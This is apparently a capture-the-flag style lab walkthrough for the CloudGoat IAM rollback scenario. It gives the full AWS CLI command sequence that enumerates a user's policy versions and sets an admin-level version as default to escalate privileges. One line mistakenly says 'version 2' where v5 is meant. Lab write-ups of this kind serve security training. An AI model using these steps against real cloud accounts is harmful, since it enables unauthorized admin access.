# Scenario overview

So we start off with the Raynor IAM profile which we’ll check in a moment has limited permissions.

We’ll then review the previous versions of that same user’s IAM policies, and we’ll use the SetDefaultPolicyVersion action to restore a full admin policy version.


![image](https://github.com/user-attachments/assets/3a851e5d-8810-44af-aef1-910713cb5a51)

# Permissions

First things first, we need to check our current permissions for the user Raynor.

**aws iam list-attached-user-policies --user-name raynor-iam_privesc_by_rollback_cgidky1t7bwmv8 --profile raynor**

Ok so now that we see that attached policy of the user, we need to see what permissions this policy grants us.

![image](https://github.com/user-attachments/assets/7bfb25f6-9021-4bfb-8003-554d8810c762)

Using the following command we can enumerate the permissions **aws iam get-policy --policy-arn arn:aws:iam::272281913033:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidky1t7bwmv8**

![image](https://github.com/user-attachments/assets/dff4eb83-745e-48a7-96c3-45655cea8430)

We get back a useful piece of information with the DefaultVersionId because it tells us that our current default policy version id is v1.

Now we will enumerate the version number of the policy to get more information.

# Escalation

**aws iam get-policy-version --policy-arn arn:aws:iam::272281913033:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidky1t7bwmv8 --version-id v1 --profile raynor**

![image](https://github.com/user-attachments/assets/e7330369-426d-47c3-a93f-3c892eb983e2)

We can see that we have limited access. Now let’s check to see if we have more versions available than just v1.

This command will return all the versions we have access to



**aws iam list-policy-versions --policy-arn arn:aws:iam::272281913033:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidky1t7bwmv8 --profile raynor**

Knowing this, we can now try to list the IAM policies for those version to see if they have higher privileges, starting with v5

**aws iam get-policy-version --policy-arn arn:aws:iam::272281913033:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidky1t7bwmv8 --version-id v5 --profile raynor**

Right away, we can see that this policy version has full admin privileges

![image](https://github.com/user-attachments/assets/1b7ede35-5d7e-4347-b379-3d6ea09a16ff)

If we look back at the policy we have currently applied to our user, we see that we have access to iam:SetDefaultPolicyVersion, so instead, we can try to change our default policy version to this version 2 with the following command:

**aws iam set-default-policy-version --policy-arn arn:aws:iam::272281913033:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidky1t7bwmv8 --version-id v5 --profile raynor**

If we re-run this prior command:

**aws iam get-policy --policy-arn arn:aws:iam::272281913033:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidky1t7bwmv8 --profile raynor**

We’ll see that we successfully changed our policy version from v1 to v5 and now are admin!

![image](https://github.com/user-attachments/assets/924edbe6-f7c5-4c03-ac99-fd4a8f535a4f)

